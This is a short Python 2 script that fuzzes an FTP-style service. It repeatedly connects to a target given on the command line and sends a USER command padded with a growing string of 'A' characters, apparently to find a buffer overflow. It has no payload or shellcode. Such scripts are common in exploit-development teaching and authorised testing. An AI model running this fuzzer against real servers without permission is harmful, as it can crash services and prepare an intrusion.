import sys, socket, time

host = sys.argv[1]
port = int(sys.argv[2]) 					                         

length = 100 							                                  

while (length &lt; 3000):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port)) 					                        
    client.recv(1024) 						                                  
    client.send("USER " + "A" * length) 				                  
    client.recv(1024) 						                                  
    client.send("PASS pass") 					                            
    client.recv(1024) 						                                  
    client.close() 							                                    
    time.sleep(2) 							                                     
    print "Length Sent: " + str(length) 				                  
    length += 100
